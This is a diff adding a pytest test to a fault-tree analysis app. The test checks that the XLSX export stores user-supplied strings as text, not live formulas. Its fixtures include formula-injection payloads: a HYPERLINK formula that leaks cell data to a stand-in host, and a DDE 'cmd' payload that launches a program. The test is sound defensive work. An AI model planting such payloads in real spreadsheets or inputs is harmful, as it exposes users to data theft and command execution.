@@ -306,6 +306,43 @@ def test_docx_report_with_a_numeric_title(files_client, tmp_path):
     assert "123" in docx_text(response.get_data())
 
 
+def test_xlsx_export_writes_text_never_formulas(tmp_path):
+    """openpyxl stores any string that starts with '=' as a formula: a node
+    named '=HYPERLINK(...)' (from a supplier's tree or FMEA sheet) became a
+    live link in the Events sheet, '=1+1' showed as 2, and the core's FTA
+    cell ('=...' + '\\n(Type: ...)') was a broken formula Excel 'repairs'."""
+    openpyxl = pytest.importorskip("openpyxl")
+    from fta_web.engine import WebCore
+    from fta_web.excel_events import EVENT_HEADERS, export_xlsx
+
+    evil = '=HYPERLINK("http://example.invalid/?x="&A2,"Click")'
+    tree = {"id": "root", "name": "Top", "type": "Root", "logicGate": "OR", "children": [
+        {"id": "a", "name": evil, "probability": 0.1, "children": [],
+         "trace": {"requirementId": "=1+1", "tags": ["=2+2"]},
+         "fmea": {"id": "=F1", "cause": "=cmd|' /C calc'!A0"}},
+        {"id": "b", "name": "Valve", "probability": 0.2, "children": []}]}
+    core = WebCore()
+    core.set_data(tree)
+    core.set_metadata(title="=SUM(1,2)", date="2026-01-01", mode="FTA")
+    core.recalculate_probabilities()
+    path = tmp_path / "f.xlsx"
+    ok, error = export_xlsx(core, str(path))
+    assert ok, error
+    wb = openpyxl.load_workbook(path)
+    for ws in wb.worksheets:
+        formulas = [c.coordinate for row in ws.iter_rows() for c in row if c.data_type == "f"]
+        assert formulas == [], (ws.title, formulas)
+    events = wb["Events"]
+    col = {h: i + 1 for i, h in enumerate(EVENT_HEADERS)}
+    assert events.cell(row=3, column=col["Name"]).value == evil
+    assert events.cell(row=3, column=col["Requirement ID"]).value == "=1+1"
+    assert events.cell(row=3, column=col["FMEA cause"]).value == "=cmd|' /C calc'!A0"
+    fta_cells = [c.value for row in wb["FTA"].iter_rows() for c in row if c.value]
+    assert any(v.startswith(evil + "\n(") for v in fta_cells)
+    analysis = {r[0].value: r[1].value for r in wb["Analysis"].iter_rows(min_row=2)}
+    assert analysis["Title"] == "=SUM(1,2)"
+
+
 def test_docx_route_with_control_characters(files_client, tmp_path):
     pytest.importorskip("docx")
     open_doc(files_client, write_doc(tmp_path / "c.json", control_char_tree(), title="T\x02"))
